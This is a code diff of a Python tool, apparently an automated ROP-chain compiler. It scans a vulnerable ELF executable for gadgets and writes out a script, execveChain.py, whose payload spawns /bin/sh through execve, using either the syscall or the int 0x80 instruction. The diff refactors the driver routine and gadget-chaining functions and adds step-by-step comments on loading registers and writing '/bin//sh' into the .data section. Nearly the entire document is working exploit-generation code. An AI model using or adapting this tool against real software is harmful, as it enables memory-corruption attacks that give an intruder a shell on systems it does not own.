@@ -3,6 +3,7 @@
 from elftools.elf.elffile import ELFFile
 import capstone
 import struct
+import sys
 
 import general
 import print_pretty
@@ -10,12 +11,9 @@ import categorize
 import get_gadgets
 
 
-# This file has routines which will get ROPChains for different exploit functions. 
-
-# payload = bytes()
-
 
 # Takes in 1-instruction GadgetList (general.ALLGADGETS) and name of the vulnerable executable
+# This is the driver routine which will chain the rop-gadgets and get execve shellcode
 def execveROPChain(GadgetList, vulnExecutable): 
 
     print("\n\n-->Chaining to get a shell using execve system call")
@@ -37,35 +35,32 @@ def execveROPChain(GadgetList, vulnExecutable):
         print("Exiting tool :(")
         sys.exit()
     
-    # This is what we have to do: 
+    # There are 2 choices here: 
     
-    # if int 0x80 is found, 
-        # rax <- 11
-        # rbx <- Address of "/bin/sh"
-        # rcx <- 0
-        # rdx <- 0
-        # int 0x80
-    
+    # Choice - 1
     # if syscall is found, 
         # rax <- 59
         # rdi <- Address of "/bin/sh"
         # rsi <- 0
         # rdx <- 0
         # syscall
-    
+    if len(syscallList) > 0: 
+        case2(GadgetList, data_section_addr)
+        sys.exit()
 
-    # Always choose int 0x80 over syscall if int 0x80 is present because registers used are common ones and eax should be set to 11. 
+    # Choice - 2
+    # if int 0x80 is found, 
+        # rax <- 11
+        # rbx <- Address of "/bin/sh"
+        # rcx <- 0
+        # rdx <- 0
+        # int 0x80
+    elif len(intList) > 0: 
+        case1(GadgetList, data_section_addr)
+        sys.exit()
 
-    # # Will always go for int 0x80(if present) because rax should be incremented only 11 times for execve()
-    # elif len(intList) > 0 : 
-    #     payload = case1(GadgetList)
-    #     return payload
-    
-    # if len(syscallList) > 0: 
-    payload = case2(GadgetList, data_section_addr)
-    return payload
-    
-    print("If this is getting printed, it means there are no special instructions found. So, you know what this means!")
+    print("--> No syscall / int 0x80 found => ROP Chaining failed")
+    sys.exit()
 
 
 def canWrite(movQwordGadgets, popGadgets):
@@ -92,12 +87,11 @@ def canWrite(movQwordGadgets, popGadgets):
     return list()
 
 
-# If int 0x80 is present.
+# If "int 0x80" is present
 def case1(GadgetList) : 
 
     print("Entering case1")
 
-    payload = bytes()
     fd = open("execveChain.py", "w")
     writeHeader(fd)
 
@@ -121,10 +115,6 @@ def case1(GadgetList) :
                 # Put 11 in the payload
                 # Execute "pop rax; ret"
                
-            # Update payload
-            payload += struct.pack("<Q", 11)
-            payload += struct.pack("<Q", int(inst['address']))
-                
 
             # Write it into the file
             fd.write("payload += struct.pack('<Q', 11)")
@@ -151,8 +141,6 @@ def case1(GadgetList) :
                 # Execute "xor rax, rax; ret"
                 # Find for arithmetic gadgets which will increase rax's value to 11
 
-            # Update payload
-            payload += struct.pack("<Q", int(inst['address']))
 
             # Write it into the file
             fd.write("payload += struct.pack('<Q', ")
@@ -190,11 +178,7 @@ def case1(GadgetList) :
             # Steps to be taken: 
                 # Put 0 in the payload
                 # Execute "pop rax; ret"
-               
-            # Update payload
-            payload += struct.pack("<Q", 0)
-            payload += struct.pack("<Q", int(inst['address']))
-                
+                               
 
             # Write it into the file
             fd.write("payload += struct.pack('<Q', 0)")
@@ -235,48 +219,43 @@ def case1(GadgetList) :
     #     x = x + 1
 
 
+# If "syscall" instruction is found: 
 
-# If syscall is present.
+# These are the steps to be followed. 
+#
+# 1. rax <- 59
+# 2. Write "/bin//sh" into .data section
+# 3. rdi <- .data section's address
+# 4. rsi <- 0
+# 5. rdx <- 0
+# 6. Execute "syscall" instruction
+
 def case2(GadgetList, data_section_addr) : 
 
-    # print("Entering case2")
-
-
-    payload = bytes()
+    # Open the file where the payload is written in the form of a python script
     fd = open("execveChain.py", "w")
     writeHeader(fd)
     
-    # Writing "/bin//sh" into .data section
+    # Step-2: Writing "/bin//sh" into .data section
+    
     popGadgets = get_gadgets.getPopGadgets(get_gadgets.allGadgets)
     movQwordGadgets = get_gadgets.getMovQwordGadgets(get_gadgets.allGadgets)
 
-    # movQwordGadgets = set([x for x in movQwordGadgets])
-
     movpopGadgets = canWrite(movQwordGadgets, popGadgets)
-    # print(movpopGadgets)
+
     movGadget = movpopGadgets[0][0]
     popGadget1 = movpopGadgets[1][0]
     popGadget2 = movpopGadgets[2][0]
-    # print("\n\n\n--------------------\n\n\n")
-    # print(movGadget, popGadget1, popGadget2)
-
-    # print("\n\n\npopGadget2\n\n\n")
-    # print(popGadget2)
-
-    # Put .data's address onto stack
-    # Execute popGadget1 => Reg1 will have .data's address
-    # Put "/bin//sh" into stack
-    # Execute popGadget2 => Reg2 will have "/bin/sh"
-    # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
-
    
-
+    
+    # Execute popGadget1 => Reg1 will have .data's address
     fd.write("payload += struct.pack('<Q', ")
     fd.write(hex(int(popGadget1['address'])))
     fd.write(")")
     fd.write("\t\t# Address of pop Reg1; ret")
     fd.write("\n\t")
-    
+
+    # Put .data's address onto stack
     fd.write("payload += struct.pack('<Q', ")
     fd.write(hex(int(data_section_addr)))
     fd.write(")")
@@ -284,28 +263,33 @@ def case2(GadgetList, data_section_addr) :
     fd.write("\n\t")
 
    
-
+    # Execute popGadget2 => Reg2 will have "/bin/sh"
     fd.write("payload += struct.pack('<Q', ")
     fd.write(hex(int(popGadget2['address'])))
     fd.write(")")
     fd.write("\t\t# Address of pop Reg2; ret")
     fd.write("\n\t")
 
+    # Put "/bin//sh" into stack
     fd.write("payload += struct.pack('<Q', ")
     fd.write("0x68732f2f6e69622f")
     fd.write(")")
     fd.write("\t\t# ascii of '/bin//sh'")
     fd.write("\n\t")
 
+    # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
     fd.write("payload += struct.pack('<Q', ")
     fd.write(hex(int(movGadget['address'])))
     fd.write(")")
     fd.write("\t\t# Address of pop qword ptr [Reg1], Reg2; ret")
     fd.write("\n\t")
 
-    # rax <- 59
+    
+    # At this point, payload to write "/bin//sh" is successfully written into execcvevChain.py
+
+
+    # Step-1: rax <- 59
     raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")
-    # print(raxList)
 
     # Search for "pop rax; ret"
     x = 0
@@ -321,10 +305,6 @@ def case2(GadgetList, data_section_addr) :
                 # Put 11 in the payload
                 # Execute "pop rax; ret"
                
-            # Update payload
-            payload += struct.pack("<Q", 59)
-            payload += struct.pack("<Q", int(inst['address']))
-                
 
             # Write it into the file
             fd.write("payload += struct.pack('<Q', 59)")
@@ -351,9 +331,6 @@ def case2(GadgetList, data_section_addr) :
                 # Execute "xor rax, rax; ret"
                 # Find for arithmetic gadgets which will increase rax's value to 11
 
-            # Update payload
-            payload += struct.pack("<Q", int(inst['address']))
-            # print("\n\n\nRAX = ", inst)
 
             # Write it into the file
             fd.write("payload += struct.pack('<Q', ")
@@ -364,7 +341,7 @@ def case2(GadgetList, data_section_addr) :
 
             # print("\n\n\nxor rax, rax; ret: ", inst)
 
-            if changeRegValue(GadgetList, "rax", 0, 59, payload, fd) == 0: 
+            if changeRegValue(GadgetList, "rax", 0, 59, fd) == 0: 
                 print("Unable to find gadgets which can change rax's value")
                 print("Exiting...")
                 sys.exit()
@@ -395,12 +372,7 @@ def case2(GadgetList, data_section_addr) :
             # Steps to be taken: 
                 # Put 0 in the payload
                 # Execute "pop rsi; ret"
-               
-            # Update payload
-            payload += struct.pack("<Q", 0)
-            payload += struct.pack("<Q", int(data_section_addr))
-                
-
+                               
             # Write it into the file
             fd.write("payload += struct.pack('<Q', ")
             fd.write(hex(int(inst['address'])))
@@ -432,13 +404,8 @@ def case2(GadgetList, data_section_addr) :
                 # Put 0 in the payload
                 # Execute "pop rdi; ret"
                
-            # Update payload
-            payload += struct.pack("<Q", 0)
-            payload += struct.pack("<Q", int(inst['address']))
                 
-
             # Write it into the file
-           
             fd.write("payload += struct.pack('<Q', ")
             fd.write(hex(int(inst['address'])))
             fd.write(")")
@@ -466,10 +433,6 @@ def case2(GadgetList, data_section_addr) :
                 # Put 0 in the payload
                 # Execute "pop rax; ret"
                
-            # Update payload
-            payload += struct.pack("<Q", 0)
-            payload += struct.pack("<Q", int(inst['address']))
-                
 
             # Write it into the file
            
@@ -506,7 +469,7 @@ def case2(GadgetList, data_section_addr) :
 
 
 
-def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) : 
+def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, fd) : 
 
     # print("Inside changeRegValue")
 
@@ -537,9 +500,6 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) :
 
                     # Execute inc Reg; Ret
 
-                    # Update payload
-                    payload += struct.pack("<Q", int(inst['address']))
-
                     # Write into file
                     fd.write("payload += struct.pack('<Q', ")
                     fd.write(hex(int(inst['address'])))
@@ -569,9 +529,6 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) :
                 while counter < (CurrentValue - FinalValue) : 
 
                     # Execute "dec Reg; ret"
-
-                    # Update payload
-                    payload += struct.pack("<Q", int(inst['address']))
 
                     # Write into file
                     fd.write("payload += struct.pack('<Q', ")
@@ -611,9 +568,6 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) :
 
                     # execute "add Reg, 1; ret"
 
-                    # Update payload
-                    payload += struct.pack("<Q", int(inst['address']))
-
                     # Write into file
                     fd.write("payload += struct.pack('<Q', ")
                     fd.write(hex(int(inst['address'])))
@@ -645,9 +599,6 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) :
 
             #         # execute add Reg, const; ret"
 
-            #         # Update payload
-            #         payload += struct.pack("<Q", int(inst['address']))
-
             #         # Write into file
             #         fd.write("payload += struct.pack('<Q', ")
             #         fd.write(hex(int(inst['address'])))
@@ -676,9 +627,6 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) :
 
             #         # execute "add Reg, -1; ret"
 
-            #         # Update payload
-            #         payload += struct.pack("<Q", int(inst['address']))
-
             #         # Write into file
             #         fd.write("payload += struct.pack('<Q', ")
             #         fd.write(hex(int(inst['address'])))
@@ -697,9 +645,6 @@ def changeRegValue(GadgetList, Reg, CurrentValue, FinalValue, payload, fd) :
             #     while quo > 0: 
 
             #         # execute "add Reg, -ve number; ret"
-
-            #         # Update payload
-            #         payload += struct.pack("<Q", int(inst['address']))
 
             #         # Write into file
             #         fd.write("payload += struct.pack('<Q', ")
